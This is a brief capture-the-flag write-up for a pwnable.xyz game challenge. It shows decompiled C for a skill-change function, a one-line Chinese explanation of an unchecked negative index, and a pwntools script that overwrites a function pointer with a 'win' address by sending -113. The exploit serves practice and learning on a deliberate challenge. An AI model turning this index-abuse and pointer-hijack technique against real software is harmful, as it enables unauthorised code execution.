逻辑类



```c

void do_skill_change(void)

{
  long lVar1;
  Player *pPVar2;
  long lVar3;
  long lVar4;
  ulong uVar5;
  long in_FS_OFFSET;
  Player *player;
  long destSkill;
  Skill *skill;
  long isAttack;
  char buf [64];
  
  lVar1 = *(long *)(in_FS_OFFSET + 0x28);
  memset(buf,0,0x40);
  printf("Since you\'re a %s now, you may modify your skills before battle.\nDo you want to change t he type of your skills (y/n)? : "
         ,Ranks[Rank]);
  fgets(buf,3,stdin);
  if (buf[0] == 'y') {
    show_skills();
    pPVar2 = getPlayer(0,0);
    while( true ) {
      printf("Which skill do you want to change (3 to exit): ");
      lVar3 = get_long();
      if (2 < lVar3) break;
      printf("What type of skill is this (0: Heal, 1: Attack): ");
      lVar4 = get_long();
      if (lVar4 < 2) {                      // A
        pPVar2->Skills[lVar3].Skill_Func =
             (anon_subr_void_Skill_ptr_Player_ptr_Player_ptr_for_Skill_Func *)SkillTable[lVar4];  // B
        pPVar2->Skills[lVar3].IsAttackSkill = (int)lVar4;
        uVar5 = get_rand(1000);
        pPVar2->Skills[lVar3].Value = uVar5;
      }
    }
  }
  if (lVar1 == *(long *)(in_FS_OFFSET + 0x28)) {
    return;
  }
                    /* WARNING: Subroutine does not return */
  __stack_chk_fail();
}


```



A行并没有判断负数，配合B行将函数指针覆盖成win函数



```python
from pwn import *

context.terminal = ['tmux', 'splitw', '-h']


p = remote('svc.pwnable.xyz', 30020)
# p = process('./challenge')


win_addr = 0x401372

rank = 0
while True:
    buffer = p.recvuntil(b' : ')[:-3]

    if b'Which skill do you want to use' in buffer:
        p.sendline(b'1')
        p.sendlineafter(b'Which target you want to use that skill on :', b'0')
    elif b'Do you want to change your equip' in buffer:
        rank += 1
        if rank == 3:
            p.sendline(b'y')
            p.sendafter(b'Name for your equip:', p64(win_addr) + (p8(0) * 0x17))
        else:
            p.sendline(b'n')
    elif b'Do you want to change the type of your skills' in buffer:
        if rank == 3:
            p.sendline(b'y')
            # gdb.attach(p)
            p.sendlineafter(b'Which skill do you want to change (3 to exit)', b'1')
            p.sendlineafter(b'What type of skill is this (0: Heal, 1: Attack):', b'-113')
            p.sendlineafter(b'Which skill do you want to change (3 to exit)', b'3')
            p.interactive()
        else:
            p.sendline(b'n')
    elif b'2v2 Arena (Approx.' in buffer:
        continue
    else:
        error(buffer)

```

